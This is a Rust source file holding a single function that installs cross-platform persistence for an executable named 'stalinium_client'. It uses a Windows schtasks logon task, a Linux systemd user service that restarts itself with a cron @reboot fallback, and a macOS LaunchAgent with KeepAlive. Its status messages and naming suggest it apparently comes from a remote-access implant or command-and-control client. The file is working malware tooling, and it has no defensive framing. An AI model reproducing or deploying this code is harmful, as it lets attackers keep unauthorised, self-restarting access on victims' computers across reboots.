use std::process::Command;
use std::io::Write;

pub fn add_persistence() {
    let exe_path = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "stalinium_client".to_string());

    if cfg!(target_os = "windows") {
        let status = Command::new("schtasks")
            .args(&["/create", "/sc", "onlogon", "/tn", "StaliniumClient", "/tr", &exe_path, "/f"])
            .status();
        match status {
            Ok(s) if s.success() => eprintln!("[*] Persistence added (schtasks)."),
            _ => eprintln!("[!] Failed to add persistence."),
        }
    } else if cfg!(target_os = "linux") {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let svc_dir = format!("{}/.config/systemd/user", home);
        let svc_path = format!("{}/stalinium-client.service", svc_dir);
        let unit = format!(
            "[Unit]\nDescription=Stalinium Client\nAfter=network.target\n\n\
             [Service]\nExecStart={}\nRestart=always\nRestartSec=10\n\n\
             [Install]\nWantedBy=default.target\n",
            exe_path
        );

        let systemd_ok = std::fs::create_dir_all(&svc_dir).is_ok()
            && std::fs::write(&svc_path, &unit).is_ok()
            && Command::new("systemctl")
                .args(&["--user", "enable", "--now", "stalinium-client.service"])
                .status()
                .map(|s| s.success())
                .unwrap_or(false);

        if systemd_ok {
            eprintln!("[*] Persistence added (systemd).");
        } else {
            let existing = Command::new("crontab").arg("-l").output()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();
            if existing.contains(&exe_path) {
                eprintln!("[*] Persistence already configured (cron).");
                return;
            }
            let new_cron = format!("{}\n@reboot {}\n", existing.trim(), exe_path);
            if let Ok(mut child) = Command::new("crontab")
                .arg("-")
                .stdin(std::process::Stdio::piped())
                .spawn()
            {
                let _ = child.stdin.as_mut().map(|s| s.write_all(new_cron.as_bytes()));
                match child.wait() {
                    Ok(s) if s.success() => eprintln!("[*] Persistence added (cron)."),
                    _ => eprintln!("[!] Failed to add persistence."),
                }
            }
        }
    } else if cfg!(target_os = "macos") {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let plist_path = format!("{}/Library/LaunchAgents/com.stalinium.client.plist", home);
        let plist = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
             <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \
             \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
             <plist version=\"1.0\">\n<dict>\n\
             \t<key>Label</key>\n\t<string>com.stalinium.client</string>\n\
             \t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>{}</string>\n\t</array>\n\
             \t<key>RunAtLoad</key>\n\t<true/>\n\
             \t<key>KeepAlive</key>\n\t<true/>\n\
             </dict>\n</plist>",
            exe_path
        );
        let ok = std::fs::write(&plist_path, &plist).is_ok()
            && Command::new("launchctl")
                .args(&["load", &plist_path])
                .status()
                .map(|s| s.success())
                .unwrap_or(false);
        if ok {
            eprintln!("[*] Persistence added (launchd).");
        } else {
            eprintln!("[!] Failed to add macOS persistence.");
        }
    } else {
        eprintln!("[*] Persistence: unsupported platform, skipping.");
    }
}
